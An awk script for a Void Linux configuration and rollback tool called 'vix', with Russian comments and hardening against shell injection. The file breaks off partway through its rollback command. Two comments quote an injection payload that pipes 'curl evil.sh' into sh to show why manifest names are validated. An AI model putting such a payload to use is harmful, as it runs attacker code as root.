#!/usr/bin/awk -f

# Функция для точного определения домашней папки (работает и с sudo, и без)
function get_user_home(   cmd, line, home) {
    cmd = "echo $SUDO_USER"
    if ((cmd | getline line) > 0 && line != "") {
        home = "/home/" line
    } else {
        close(cmd)
        cmd = "echo $USER"
        if ((cmd | getline line) > 0) {
            if (line == "root") home = "/root"
            else home = "/home/" line
        } else {
            home = "/home/default"
        }
    }
    close(cmd)
    gsub(/[ \t\r\n]/, "", home)
    return home
}

# Экранирует произвольную строку для безопасной подстановки в одинарные
# кавычки POSIX shell. После этого результат можно вставлять в любую
# system()-команду, независимо от содержимого строки (кавычки, $, `, ; , |,
# переводы строк и т.д. больше не могут "вырваться" наружу и выполниться).
# Техника стандартная: закрыть кавычку, вставить экранированную одинарную
# кавычку, открыть кавычку заново.
function shq(s) {
    gsub(/'/, "'\"'\"'", s)
    return "'" s "'"
}

# Строгая проверка "безопасного" идентификатора (имя пакета/сервиса/файла
# репозитория/доп.папки), который приходит из ТЕКСТОВЫХ манифестов
# (packages.vix, services.vix, repo.vix, extra.vix). Эти файлы пользователь
# может редактировать вручную, импортировать из чужого dotfiles-репозитория
# и т.п. - т.е. их содержимое нельзя считать полностью доверенным. Без этой
# проверки строка из манифеста подставлялась бы в 'sudo xbps-install',
# 'sudo cp' и т.д., и специально сформированное имя вида
#   vim"; curl evil.sh | sh #
# привело бы к выполнению произвольных команд ОТ ROOT. Разрешаем только
# буквы, цифры, точку, дефис, подчёркивание и плюс - этого достаточно для
# любых реальных имён пакетов/сервисов/файлов репозитория XBPS.
function is_safe_name(s) {
    return (s != "" && s !~ /^-/ && s ~ /^[A-Za-z0-9_+.-]+$/)
}

# Функция для безопасного создания папок - сразу выдаёт права на запись
# владельцу (иначе новая папка может унаследовать ограничивающий umask/маску
# и не даться на запись при следующем обращении).
function mkdir_p(dir) {
    system("mkdir -p \"" dir "\" && chmod u+rwx \"" dir "\"")
}

# Рекурсивно снимает "только чтение" (444 у файлов / 555 у папок), которое
# специально стоит на неизменяемых слепках store/<hash> и переносится вместе
# с содержимым при любом 'cp -a' ИЗ store в живые пути (dotfiles/,
# packages.vix, services.vix, repo.vix, extra.vix, config.vix/<extra>/...).
# Без этого следующие rm -rf / cp -a / запись в те же live-пути падают с
# Permission denied у того же пользователя-владельца - это и есть причина
# "дотфайлы не меняются при роллбеке" и общих проблем с правами в config.vix.
function make_writable(path) {
    system("chmod -R u+rwX \"" path "\" 2>/dev/null")
}

# Блокировка: не даёт двум процессам vix одновременно менять систему.
# Директория lock-а создаётся атомарно (mkdir либо создаст, либо упадёт, если
# уже есть) - в отличие от файла, это гонко-безопасно на уровне ФС.
function acquire_lock(   pid_file, existing_pid, alive) {
    if (system("mkdir " shq(LOCKDIR) " 2>/dev/null") != 0) {
        pid_file = LOCKDIR "/pid"
        existing_pid = ""
        if ((getline existing_pid < pid_file) > 0) gsub(/[ \t\r\n]/, "", existing_pid)
        close(pid_file)

        # existing_pid читается из файла - в норме мы сами туда пишем только
        # PROCINFO["pid"] (число), но валидируем строго: если содержимое не
        # чисто числовое, НЕ передаём его в system("kill -0 " existing_pid),
        # иначе испорченный/подложенный pid-файл превращается в инъекцию
        # команд. Считаем такую блокировку зависшей/повреждённой.
        alive = 0
        if (existing_pid ~ /^[0-9]+$/) {
            alive = (system("kill -0 " existing_pid " 2>/dev/null") == 0)
        }

        if (alive) {
            print "\033[31m" "Ошибка: Другой процесс vix уже выполняется (PID " existing_pid ")." "\033[0m"
            print "Если это не так (процесс завис/убит), удалите вручную: " LOCKDIR
            exit 1
        }

        print "Обнаружена зависшая или повреждённая блокировка, снимаю..."
        make_writable(LOCKDIR)
        system("rm -rf " shq(LOCKDIR))
        if (system("mkdir " shq(LOCKDIR) " 2>/dev/null") != 0) {
            print "\033[31m" "Ошибка: Не удалось захватить блокировку " LOCKDIR "\033[0m"
            exit 1
        }
    }
    print PROCINFO["pid"] > (LOCKDIR "/pid")
    close(LOCKDIR "/pid")
    LOCK_ACQUIRED = 1
}

function release_lock() {
    if (LOCK_ACQUIRED) {
        system("rm -rf " shq(LOCKDIR))
        LOCK_ACQUIRED = 0
    }
}

# Оставляет только MAX_GENERATIONS последних (по времени) поколений в store/.
# Текущее поколение (store/current) никогда не удаляется, даже если оно
# старше остальных - например, сразу после rollback на старый снапшот.
function prune_old_generations(   gens_cmd, gdir, gen_count, i, cur_dir, readlink_cmd, plist, oldest_i) {
    gens_cmd = "find \"" VOID_STORE "\" -mindepth 1 -maxdepth 1 -type d ! -name current -print0 2>/dev/null | xargs -0r ls -td 2>/dev/null"
    gen_count = 0
    while ((gens_cmd | getline gdir) > 0) plist[++gen_count] = gdir
    close(gens_cmd)

    # Чёткое ограничение: пока поколений не больше MAX_GENERATIONS - ничего
    # не удаляется вообще.
    if (gen_count <= MAX_GENERATIONS) return

    cur_dir = ""
    readlink_cmd = "readlink -f \"" VOID_STORE "/current\" 2>/dev/null"
    if ((readlink_cmd | getline cur_dir) > 0) gsub(/[ \t\r\n]/, "", cur_dir)
    close(readlink_cmd)

    # plist отсортирован по убыванию mtime (новые первые). Идём с хвоста
    # (самое старое) к началу и удаляем ОДНО самое старое поколение, которое
    # не является текущим - не больше и не меньше одного за вызов.
    oldest_i = 0
    for (i = gen_count; i >= 1; i--) {
        if (plist[i] == cur_dir) continue
        oldest_i = i
        break
    }
    if (oldest_i == 0) return

    make_writable(plist[oldest_i])
    system("rm -rf \"" plist[oldest_i] "\"")
    print "-> Сборка мусора: удалено ровно одно (самое старое) поколение из-за превышения лимита хранения (" MAX_GENERATIONS ")"
}

# Хэш содержимого папки (рекурсивно, пути относительные - не зависят от расположения папки)
function get_dir_hash(dir,    cmd, h) {
    if (system("[ -d " shq(dir) " ]") != 0) return ""
    cmd = "(cd " shq(dir) " 2>/dev/null && find . -type f -print0 | sort -z | xargs -0 sha256sum 2>/dev/null) | sha256sum | cut -d' ' -f1"
    h = ""
    if ((cmd | getline h) > 0) gsub(/[ \t\r\n]/, "", h)
    close(cmd)
    return h
}

# Хэш одного файла
function get_file_hash(file,    cmd, h) {
    if (system("[ -f " shq(file) " ]") != 0) return ""
    cmd = "sha256sum " shq(file) " 2>/dev/null | cut -d' ' -f1"
    h = ""
    if ((cmd | getline h) > 0) gsub(/[ \t\r\n]/, "", h)
    close(cmd)
    return h
}

# Комбинированный хэш всех папок, зарегистрированных через 'vix add' (extra.vix).
# is_store=0 - считаем по живым папкам в VOID_CONFIG; is_store=1 - по слепку
# last_store_dir/extra.vix + last_store_dir/extra/<name>/ (нужен для Шага А).
# В хэш попадают и путь-источник, и имя - переподключение той же папки под
# другим путём тоже считается изменением.
function get_extra_combined_hash(is_store,   ef, name, ex_path, eq, line_, h, dpath, any, tmp_file, mktemp_cmd, hash_cmd, result) {
    ef = is_store ? (last_store_dir "/extra.vix") : EXTRA_FILE
    if (system("[ -f " shq(ef) " ]") != 0) return ""

    tmp_file = ""
    mktemp_cmd = "mktemp /tmp/vix_extra_buf.XXXXXX 2>/dev/null"
    if ((mktemp_cmd | getline tmp_file) > 0) gsub(/[ \t\r\n]/, "", tmp_file)
    close(mktemp_cmd)
    if (tmp_file == "") tmp_file = "/tmp/vix_extra_buf." PROCINFO["pid"]

    any = 0
    while ((getline line_ < ef) > 0) {
        if (line_ == "") continue
        eq = index(line_, "=")
        if (eq <= 0) continue
        name = substr(line_, 1, eq-1)
        if (!is_safe_name(name)) continue
        ex_path = substr(line_, eq+1)
        dpath = is_store ? (last_store_dir "/extra/" name) : (VOID_CONFIG "/" name)
        h = get_dir_hash(dpath)
        print name "=" ex_path ":" h >> tmp_file
        any = 1
    }
    close(ef)
    close(tmp_file)

    if (!any) { system("rm -f \"" tmp_file "\""); return "" }

    hash_cmd = "sort \"" tmp_file "\" | sha256sum | cut -d' ' -f1"
    result = ""
    if ((hash_cmd | getline result) > 0) gsub(/[ \t\r\n]/, "", result)
    close(hash_cmd)
    system("rm -f \"" tmp_file "\"")
    return result
}

# Общий хэш конфигурации (дотфайлы + пакеты + сервисы + репозитории [+ доп.
# папки, если 'vix add' использовался]). Используется и для имени слепка в
# store/, и для сравнения "до/после" выполнения шагов.
function compute_combined_hash(   cmd, h, extra_h) {
    cmd = "(find \"" DOTFILES "\" -type f -print0 | sort -z | xargs -0 sha256sum; " \
          "[ -f \"" PKG_FILE "\" ] && sha256sum \"" PKG_FILE "\"; " \
          "[ -f \"" SVC_FILE "\" ] && sha256sum \"" SVC_FILE "\"; " \
          "[ -f \"" REPO_FILE "\" ] && sha256sum \"" REPO_FILE "\""
    if (has_extra) {
        extra_h = get_extra_combined_hash(0)
        cmd = cmd "; echo \"extra:" extra_h "\""
    }
    cmd = cmd ") | sha256sum | cut -d' ' -f1"
    h = ""
    if ((cmd | getline h) > 0) gsub(/[ \t\r\n]/, "", h)
    close(cmd)
    return h
}

# Функция для чистки имени пакета от версий и знаков сравнения (сохраняя дефисы в имени)
function clean_package_name(pkg) {
    if (pkg ~ /[><=]/) {
        split(pkg, parts, "[><=]")
        pkg = parts[1]
    }
    gsub(/-[0-9].*$/, "", pkg)
    gsub(/[ \t\r\n]/, "", pkg)
    return pkg
}

# Генерация/обновление контента для packages.vix строго в алфавитном порядке
function generate_packages_config(target_file,    xbps_cmd, pkg, i, count, sorted_pkgs) {
    print "# Автоматически сгенерированный список пакетов VIX" > target_file
    print "  -> Сбор и индексация локальной базы пакетов..."
    
    count = 0
    xbps_cmd = "xbps-query -l | awk '{print $2}'" 
    while ((xbps_cmd | getline pkg) > 0) {
        pkg = clean_package_name(pkg)
        if (pkg != "" && is_safe_name(pkg)) sorted_pkgs[++count] = pkg
    }
    close(xbps_cmd)
    
    asort(sorted_pkgs)

    delete seen_pkgs_gen
    for (i = 1; i <= count; i++) {
        pkg = sorted_pkgs[i]
        if (pkg in seen_pkgs_gen) continue
        seen_pkgs_gen[pkg] = 1
        print pkg >> target_file
    }
}

# Двухсекционная генерация сервисов без дубликатов (var/service верх, etc/sv низ)
function generate_services_config(target_file,    sv_cmd, service, active_count, inactive_count, active_list, inactive_list, i) {
    active_count = 0
    inactive_count = 0

    sv_cmd = "find /etc/sv -maxdepth 1 -mindepth 1 -type d"
    while ((sv_cmd | getline service) > 0) {
        sub(".*/", "", service)
        if (service == "" || !is_safe_name(service)) continue
        
        if (system("[ -L /var/service/" shq(service) " ]") == 0) {
            active_list[++active_count] = service
        } else {
            inactive_list[++inactive_count] = service
        }
    }
    close(sv_cmd)

    asort(active_list)
    asort(inactive_list)

    print "# Автоматически сгенерированный список сервисов VIX\n" > target_file
    
    print "# var/service" >> target_file
    for (i = 1; i <= active_count; i++) {
        if (system("[ -f /etc/sv/" shq(active_list[i]) "/down ]") == 0) {
            print active_list[i] " = false" >> target_file
        } else {
            print active_list[i] " = true" >> target_file
        }
    }

    print "\n# etc/sv" >> target_file
    for (i = 1; i <= inactive_count; i++) {
        print inactive_list[i] " = false" >> target_file
    }
}

# Записывает содержимое одной директории (плоско) в уже открытый на запись файл
function serialize_repo_section(src_dir, target_flat_file,    find_cmd, rfile, line) {
    find_cmd = "find \"" src_dir "\" -maxdepth 1 -type f 2>/dev/null"
    while ((find_cmd | getline rfile) > 0) {
        sub(".*/", "", rfile)
        print "@@FILE:" rfile >> target_flat_file
        while ((getline line < (src_dir "/" rfile)) > 0) {
            print line >> target_flat_file
        }
        close(src_dir "/" rfile)
    }
    close(find_cmd)
}

# Сериализует usr/share/xbps.d и etc/xbps.d в ОДИН файл repo.vix, разделяя
# секции комментариями-заголовками (именно в этом порядке: share, потом etc).
function serialize_repo_all(target_file) {
    print "#usr/share/xbps.d" > target_file
    serialize_repo_section("/usr/share/xbps.d", target_file)
    print "" >> target_file
    print "#etc/xbps.d" >> target_file
    serialize_repo_section("/etc/xbps.d", target_file)
    close(target_file)
}

# Сравнивает временный буфер с реальным файлом в системе и при расхождении
# копирует (через sudo). Возвращает 1, если было изменение.
function repo_flush(target_sys_dir, current_file, tmp_file,    changed, dest) {
    if (current_file == "" || tmp_file == "") return 0
    close(tmp_file)
    changed = 0
    dest = target_sys_dir "/" current_file
    if (system("cmp -s " shq(tmp_file) " " shq(dest)) != 0) {
        print "  [!] Изменение -> Обновляю репозиторий: " dest
        system("sudo cp -f " shq(tmp_file) " " shq(dest))
        changed = 1
    }
    system("rm -f " shq(tmp_file))
    return changed
}

# Десериализация ОДНОГО файла repo.vix обратно в /usr/share/xbps.d и /etc/xbps.d
# с проверкой изменений на уровне отдельных файлов внутри каждой секции.
function deserialize_repo_all(flat_file,    target_sys_dir, current_file, tmp_file, line, global_changed, mktemp_cmd) {
    if (system("[ -f \"" flat_file "\" ]") != 0) return 0

    global_changed = 0
    target_sys_dir = ""
    current_file = ""
    tmp_file = ""

    while ((getline line < flat_file) > 0) {
        if (line == "#usr/share/xbps.d" || line == "#etc/xbps.d") {
            if (repo_flush(target_sys_dir, current_file, tmp_file)) global_changed = 1
            current_file = ""; tmp_file = ""
            target_sys_dir = (line == "#usr/share/xbps.d") ? "/usr/share/xbps.d" : "/etc/xbps.d"
            system("sudo mkdir -p " shq(target_sys_dir))
            continue
        }
        if (line == "") continue
        if (line ~ /^@@FILE:/) {
            if (repo_flush(target_sys_dir, current_file, tmp_file)) global_changed = 1
            sub(/^@@FILE:/, "", line)

            # КРИТИЧНО: имя файла приходит из repo.vix (обычный текстовый
            # манифест - не полностью доверенный ввод). Раньше оно
            # подставлялось напрямую в 'sudo cp'/'cmp' - имя вида
            #   foo"; curl evil.sh | sh #
            # выполнило бы произвольные команды ОТ ROOT. Валидируем строгим
            # allowlist-ом (без '/', без '..') прежде чем использовать.
            if (!is_safe_name(line)) {
                print "\033[31m" "  [!] Небезопасное/некорректное имя файла в repo.vix пропущено: " line "\033[0m"
                current_file = ""; tmp_file = ""
                continue
            }
            current_file = line

            # Небезопасно использовать предсказуемое имя в /tmp вместе с sudo cp
            # (симлинк-атака) - создаём файл атомарно и эксклюзивно через mktemp.
            tmp_file = ""
            mktemp_cmd = "mktemp /tmp/vix_repo_buf.XXXXXX 2>/dev/null"
            if ((mktemp_cmd | getline tmp_file) > 0) gsub(/[ \t\r\n]/, "", tmp_file)
            close(mktemp_cmd)
            if (tmp_file == "") {
                # mktemp не сработал - лучше пропустить файл, чем использовать
                # предсказуемый путь в /tmp (риск symlink-атаки от другого
                # локального пользователя перед 'sudo cp').
                print "\033[31m" "  [!] Не удалось создать временный файл (mktemp) для " current_file ", пропускаю." "\033[0m"
                current_file = ""
                continue
            }

            printf "" > tmp_file
            close(tmp_file)
            continue
        }
        if (current_file != "" && target_sys_dir != "") {
            print line >> tmp_file
        }
    }
    close(flat_file)

    if (repo_flush(target_sys_dir, current_file, tmp_file)) global_changed = 1

    return global_changed
}

# УБРАНО НАВСЕГДА: раньше здесь генерировался config.vix/vix_env.sh, который
# на каждый логин переключал XDG_CONFIG_HOME на store/current/dotfiles и
# ПЕРЕПИСЫВАЛ дотфайлы в $HOME файлами-заглушками вида "source .../dotfiles/.bashrc".
# Это создавало разрушительный цикл: заглушка попадала в $HOME, а следующий
# 'vix sync' импортировал уже эту заглушку обратно в config.vix/dotfiles,
# БЕЗВОЗВРАТНО затирая настоящее содержимое дотфайла. Плюс модификация
# ~/.profile/~/.bash_profile/~/.zprofile ломала графические сессии (в т.ч.
# провоцировала "Invalid MIT-MAGIC-COOKIE-1 key / Can't open display" у sxhkd,
# запускаемого через такие профильные файлы). Дотфайлы и так физически
# копируются в $HOME на Шаге Б 'vix switch' - отдельный env-скрипт не нужен,
# полноценный откат делает 'vix rollback' (vix r), откат через загрузчик не
# требуется.
#
# Функция ниже лечит уже существующие системы: удаляет vix_env.sh, если он
# остался с прошлых версий, и вычищает добавленные им строки из профильных
# файлов, чтобы больше ничего не переписывало дотфайлы на логине.
function cleanup_env_script_remnants(home,    marker, pfile, tmp) {
    marker = home "/config.vix/vix_env.sh"

    if (system("[ -f \"" marker "\" ]") == 0) {
        print "-> Обнаружен устаревший vix_env.sh - удаляю (больше не используется, ломал дотфайлы и X-сессию)."
        system("rm -f \"" marker "\"")
    }

    pfile = home "/.profile"; tmp = pfile ".vix_clean_tmp"
    if (system("[ -f \"" pfile "\" ] && grep -qF \"" marker "\" \"" pfile "\" 2>/dev/null") == 0) {
        system("grep -vF \"" marker "\" \"" pfile "\" | grep -v '^# VIX: выбор поколения дотфайлов' > \"" tmp "\" && mv \"" tmp "\" \"" pfile "\"")
        print "-> Убрано автоподключение vix_env.sh из ~/.profile"
    }

    pfile = home "/.bash_profile"; tmp = pfile ".vix_clean_tmp"
    if (system("[ -f \"" pfile "\" ] && grep -qF \"" marker "\" \"" pfile "\" 2>/dev/null") == 0) {
        system("grep -vF \"" marker "\" \"" pfile "\" | grep -v '^# VIX: выбор поколения дотфайлов' > \"" tmp "\" && mv \"" tmp "\" \"" pfile "\"")
        print "-> Убрано автоподключение vix_env.sh из ~/.bash_profile"
    }

    pfile = home "/.zprofile"; tmp = pfile ".vix_clean_tmp"
    if (system("[ -f \"" pfile "\" ] && grep -qF \"" marker "\" \"" pfile "\" 2>/dev/null") == 0) {
        system("grep -vF \"" marker "\" \"" pfile "\" | grep -v '^# VIX: выбор поколения дотфайлов' > \"" tmp "\" && mv \"" tmp "\" \"" pfile "\"")
        print "-> Убрано автоподключение vix_env.sh из ~/.zprofile"
    }
}

BEGIN {
    USER_HOME = get_user_home()

    # Устойчивый идентификатор текущей машины. Используется, чтобы отличить
    # "манифест не менялся с прошлого switch НА ЭТОЙ ЖЕ машине" от "config.vix
    # целиком перенесён/склонирован на другую машину" - во втором случае
    # реального состояния системы, соответствующего манифестам, ещё нет, и
    # пропускать шаги применения (пакеты/сервисы/репозитории/дотфайлы) по
    # одному лишь совпадению хэшей манифестов небезопасно.
    MACHINE_ID = ""
    if ((getline MACHINE_ID < "/etc/machine-id") <= 0) {
        mid_cmd = "hostname 2>/dev/null"
        mid_cmd | getline MACHINE_ID
        close(mid_cmd)
    }
    close("/etc/machine-id")
    gsub(/[ \t\r\n]/, "", MACHINE_ID)

    cmd = ARGV[1]
    known_cmd = (cmd == "switch" || cmd == "s" || \
                 cmd == "sync" || cmd == "list" || cmd == "l" || cmd == "rollback" || cmd == "r" || \
                 cmd == "add" || cmd == "a")

    if (known_cmd && system("[ -d \"" USER_HOME "\" ]") != 0) {
        print "\033[31m" "Ошибка: Не удалось определить домашнюю папку пользователя (получено: '" USER_HOME "')." "\033[0m"
        print "Проверьте переменные окружения $SUDO_USER / $USER и запустите снова."
        exit 1
    }

    VOID_CONFIG = USER_HOME "/config.vix"
    DOTFILES = VOID_CONFIG "/dotfiles"
    VOID_STORE = VOID_CONFIG "/store"
    REPO_FILE = VOID_CONFIG "/repo.vix"

    PKG_FILE = VOID_CONFIG "/packages.vix"
    SVC_FILE = VOID_CONFIG "/services.vix"
    TMP_PKG_FILE = VOID_CONFIG "/packages.vix.tmp"
    TMP_SVC_FILE = VOID_CONFIG "/services.vix.tmp"
    EXTRA_FILE = VOID_CONFIG "/extra.vix"

    # Имена, зарезервированные под служебные файлы/папки в корне config.vix -
    # 'vix add' не даст добавить папку с таким именем.
    RESERVED_NAMES = "|dotfiles|store|packages.vix|services.vix|repo.vix|extra.vix|packages.vix.tmp|services.vix.tmp|"

    # Сколько последних поколений хранить в store/ (сборка мусора после switch).
    # ВАЖНО: раньше эта переменная задавалась строкой верхнего уровня ДО BEGIN,
    # что в awk означает "паттерн для основного цикла по записям файлов", а не
    # инициализацию - а основной цикл никогда не запускался, т.к. BEGIN всегда
    # завершается через exit. Из-за этого MAX_GENERATIONS фактически был
    # всегда пустым (0), и сборка мусора удаляла ВСЕ старые поколения вместо
    # ограничения по лимиту. Теперь значение задаётся здесь, внутри BEGIN.
    MAX_GENERATIONS = 30

    # Блокировка - только для команд, которые реально меняют систему/конфиг.
    # ВАЖНО: раньше блокировка лежала в /tmp по предсказуемому имени
    # (/tmp/.vix-lock-<home>). /tmp обычно доступен на запись всем локальным
    # пользователям (режим 1777) - значит, ДРУГОЙ пользователь мог заранее
    # создать такую папку с произвольным содержимым pid-файла и либо
    # заблокировать vix (DoS), либо (до фикса validation в acquire_lock)
    # добиться выполнения произвольной команды через "kill -0 $pid". Теперь
    # блокировка живёт внутри домашней папки самого пользователя, куда у
    # посторонних нет доступа на запись.
    if (cmd == "switch" || cmd == "s" || \
        cmd == "sync" || cmd == "rollback" || cmd == "r" || cmd == "add" || cmd == "a") {
        LOCKDIR = USER_HOME "/.vix.lock"
        acquire_lock()
    }
    
    # --- КОМАНДА: SYNC (Система -> Файл; создаёт config.vix, если его ещё нет) ---
    if (cmd == "sync") {
        print "=== Синхронизация: Система -> Конфигурация VIX ==="

        is_new = (system("[ -d \"" VOID_CONFIG "\" ]") != 0)
        if (is_new) print "Определена домашняя папка: " USER_HOME

        mkdir_p(DOTFILES)
        mkdir_p(VOID_STORE)

        old_config = USER_HOME "/.config"
        if (system("[ -d \"" old_config "\" ]") == 0) {
            print "Импортирую содержимое ~/.config ..."
            system("cp -a \"" old_config "\"/* \"" DOTFILES "\" 2>/dev/null")
        }

        print "Импортирую точечные файлы из корня " USER_HOME " ..."
        dot_cmd = "find \"" USER_HOME "\" -maxdepth 1 -type f -name '.*'"
        while ((dot_cmd | getline dotfile) > 0) {
            system("cp -a \"" dotfile "\" \"" DOTFILES "/\" 2>/dev/null")
        }
        close(dot_cmd)

        print "Перезаписываю декларации пакетов, репозиториев и сервисов..."
        serialize_repo_all(REPO_FILE)
        generate_services_config(SVC_FILE)
        generate_packages_config(PKG_FILE)

        cmd_user = "echo $SUDO_USER"
        if ((cmd_user | getline real_user) > 0 && real_user != "") {
            gsub(/[ \t\r\n]/, "", real_user)
            if (real_user ~ /^[A-Za-z0-9_.-]+$/) {
                system("chown -R " real_user ":" real_user " " shq(VOID_CONFIG))
            }
        }
        close(cmd_user)

        cleanup_env_script_remnants(USER_HOME)

        # Гарантируем права на запись для всего config.vix сразу после
        # синхронизации - на случай, если что-то раньше стало read-only
        # (например, после отката) или было импортировано из источника с
        # ограничивающими правами.
        make_writable(VOID_CONFIG)

        print "Синхронизация завершена успешно!"
        print "-> Слепок не создаётся и /store не трогается. Чтобы применить это к системе, выполните 'vix switch'."
        exit 0
    }

    # --- КОМАНДА: ADD (Зарегистрировать пользовательскую папку) ---
    if (cmd == "add" || cmd == "a") {
        print "=== Добавление пользовательской папки в VIX ==="
        if (system("[ -d \"" VOID_CONFIG "\" ]") != 0) {
            print "\033[31m" "Ошибка: Сначала выполните 'vix sync'" "\033[0m"
            exit 1
        }

        add_arg = ARGV[2]
        if (add_arg == "") {
            print "\033[31m" "Ошибка: Укажите путь к папке. Использование: vix add /путь/к/папке" "\033[0m"
            exit 1
        }

        # Разворачиваем в канонический абсолютный путь (раскрывает ~, симлинки, ..)
        resolve_cmd = "readlink -f " shq(add_arg) " 2>/dev/null"
        add_path = ""
        if ((resolve_cmd | getline add_path) > 0) gsub(/[ \t\r\n]/, "", add_path)
        close(resolve_cmd)
        if (add_path == "" || system("[ -d " shq(add_path) " ]") != 0) {
            print "\033[31m" "Ошибка: '" add_arg "' не найден или не является папкой." "\033[0m"
            exit 1
        }

        n = split(add_path, add_parts, "/")
        add_name = add_parts[n]
        if (add_name == "") {
            print "\033[31m" "Ошибка: Не удалось определить имя папки из пути " add_path "\033[0m"
            exit 1
        }
        if (index(RESERVED_NAMES, "|" add_name "|") > 0) {
            print "\033[31m" "Ошибка: Имя '" add_name "' зарезервировано под служебные файлы VIX, выберите другую папку." "\033[0m"
            exit 1
        }
        # Имя папки попадёт в extra.vix и будет подставляться в системные
        # команды при каждом последующем switch/rollback - ограничиваем
        # безопасным набором символов, чтобы никакое содержимое имени не
        # могло быть интерпретировано shell'ом.
        if (!is_safe_name(add_name)) {
            print "\033[31m" "Ошибка: Имя папки '" add_name "' содержит недопустимые символы." "\033[0m"
            print "Разрешены только буквы, цифры, '.', '_', '+', '-' (и не может начинаться с '-')."
            exit 1
        }

        add_dest = VOID_CONFIG "/" add_name

        already_registered = 0
        if (system("[ -f \"" EXTRA_FILE "\" ]") == 0) {
            while ((getline add_check < EXTRA_FILE) > 0) {
                add_eq = index(add_check, "=")
                if (add_eq > 0 && substr(add_check, 1, add_eq-1) == add_name) already_registered = 1
            }
            close(EXTRA_FILE)
        }

        if (!already_registered && system("[ -e " shq(add_dest) " ]") == 0) {
            print "\033[31m" "Ошибка: config.vix/" add_name " уже существует и не зарегистрирована через 'vix add'." "\033[0m"
            print "Переименуйте исходную папку или уберите конфликт вручную."
            exit 1
        }

        print "-> Импортирую " add_path " -> config.vix/" add_name " ..."
        make_writable(add_dest)
        mkdir_p(add_dest)
        system("find " shq(add_dest) " -mindepth 1 -maxdepth 1 -exec rm -rf {} +")
        system("cp -a " shq(add_path) "/. " shq(add_dest) "/ 2>/dev/null")
        make_writable(add_dest)

        # Перезаписываем строку реестра (на случай повторного add с тем же именем)
        add_tmp = ""
        add_mktemp_cmd = "mktemp /tmp/vix_extra_reg.XXXXXX 2>/dev/null"
        if ((add_mktemp_cmd | getline add_tmp) > 0) gsub(/[ \t\r\n]/, "", add_tmp)
        close(add_mktemp_cmd)
        if (add_tmp == "") add_tmp = "/tmp/vix_extra_reg." PROCINFO["pid"]

        if (system("[ -f \"" EXTRA_FILE "\" ]") == 0) {
            while ((getline add_line < EXTRA_FILE) > 0) {
                if (add_line == "") continue
                add_eq2 = index(add_line, "=")
                if (add_eq2 > 0 && substr(add_line, 1, add_eq2-1) == add_name) continue
                print add_line >> add_tmp
            }
            close(EXTRA_FILE)
        }
        print add_name "=" add_path >> add_tmp
        close(add_tmp)
        system("mv " shq(add_tmp) " " shq(EXTRA_FILE))

        cmd_user = "echo $SUDO_USER"
        if ((cmd_user | getline real_user) > 0 && real_user != "") {
            gsub(/[ \t\r\n]/, "", real_user)
            if (real_user ~ /^[A-Za-z0-9_.-]+$/) {
                system("chown -R " real_user ":" real_user " " shq(add_dest))
                system("chown " real_user ":" real_user " " shq(EXTRA_FILE))
            }
        }
        close(cmd_user)

        add_verb = already_registered ? "-> Обновлено: " : "-> Зарегистрировано: "
        print add_verb add_name " -> " add_path
        print "-> При следующем 'vix switch' появится Шаг Е, который будет следить за этой папкой."
        exit 0
    }

    # --- КОМАНДА: LIST (Список поколений) ---
    if (cmd == "list" || cmd == "l") {
        print "=== Поколения VIX ==="
        if (system("[ -d \"" VOID_STORE "\" ]") != 0) {
            print "Поколений пока нет. Выполните 'vix switch'."
            exit 0
        }

        gens_cmd = "find \"" VOID_STORE "\" -mindepth 1 -maxdepth 1 -type d ! -name current -print0 2>/dev/null | xargs -0r ls -td 2>/dev/null"
        gen_count = 0
        while ((gens_cmd | getline gdir) > 0) gen_list[++gen_count] = gdir
        close(gens_cmd)

        if (gen_count == 0) {
            print "Поколений пока нет. Выполните 'vix switch'."
            exit 0
        }

        current_dir = ""
        readlink_cmd = "readlink -f \"" VOID_STORE "/current\" 2>/dev/null"
        if ((readlink_cmd | getline current_dir) > 0) gsub(/[ \t\r\n]/, "", current_dir)
        close(readlink_cmd)

        for (i = 1; i <= gen_count; i++) {
            n = split(gen_list[i], gpp, "/")
            hname = gpp[n]
            date_cmd = "date -r \"" gen_list[i] "\" '+%Y-%m-%d %H:%M' 2>/dev/null"
            gdate = ""
            if ((date_cmd | getline gdate) > 0) gsub(/\r|\n/, "", gdate)
            close(date_cmd)
            marker = (gen_list[i] == current_dir) ? "  <- текущее" : ""
            printf "  %-3d %-24s %s%s\n", (i - 1), hname, gdate, marker
        }
        print "\nОткат: vix rollback [индекс|хэш]  (без аргумента - на предыдущее)"
        exit 0
    }

    # --- КОМАНДА: ROLLBACK (Откат на предыдущее/выбранное поколение) ---
    if (cmd == "rollback" || cmd == "r") {
        print "=== Откат поколения VIX ==="
        if (system("[ -d \"" VOID_CONFIG "\" ]") != 0) {
            print "\033[31m" "Ошибка: Сначала выполните 'vix sync'" "\033[0m"
            exit 1
        }
        if (system("[ -d \"" VOID_STORE "\" ]") != 0) {
            print "\033[31m" "Ошибка: Ни одного поколения ещё не зафиксировано." "\033[0m"
            exit 1
        }

        gens_cmd = "find \"" VOID_STORE "\" -mindepth 1 -maxdepth 1 -type d ! -name current -print0 2>/dev/null | xargs -0r ls -td 2>/dev/null"
        gen_count = 0
        while ((gens_cmd | getline gdir) > 0) gen_list[++gen_count] = gdir
        close(gens_cmd)

        if (gen_count == 0) {
            print "\033[31m" "Ошибка: Ни одного поколения ещё не зафиксировано." "\033[0m"
            exit 1
        }

        current_dir = ""
        readlink_cmd = "readlink -f \"" VOID_STORE "/current\" 2>/dev/null"
        if ((readlink_cmd | getline current_dir) > 0) gsub(/[ \t\r\n]/, "", current_dir)
        close(readlink_cmd)
        if (current_dir == "") current_dir = gen_list[1]

        target_arg = ARGV[2]
        target_dir = ""

        if (target_arg == "") {
            cur_idx = 0
            for (i = 1; i <= gen_count; i++) {
                if (gen_list[i] == current_dir) { cur_idx = i; break }
            }
            if (cur_idx == 0) cur_idx = 1
            if (cur_idx + 1 > gen_count) {
                print "\033[31m" "Ошибка: Более старых поколений не найдено." "\033[0m"
                exit 1
            }
            target_dir = gen_list[cur_idx + 1]
        } else if (target_arg ~ /^[0-9]+$/) {
            idx = target_arg + 1
            if (idx < 1 || idx > gen_count) {
                print "\033[31m" "Ошибка: Индекс " target_arg " вне диапазона. Смотрите 'vix list'." "\033[0m"
                exit 1
            }
            target_dir = gen_list[idx]
        } else {
            for (i = 1; i <= gen_count; i++) {
                n = split(gen_list[i], gpp, "/")
                hname = gpp[n]
                if (index(hname, target_arg) == 1) { target_dir = gen_list[i]; break }
            }
            if (target_dir == "") {
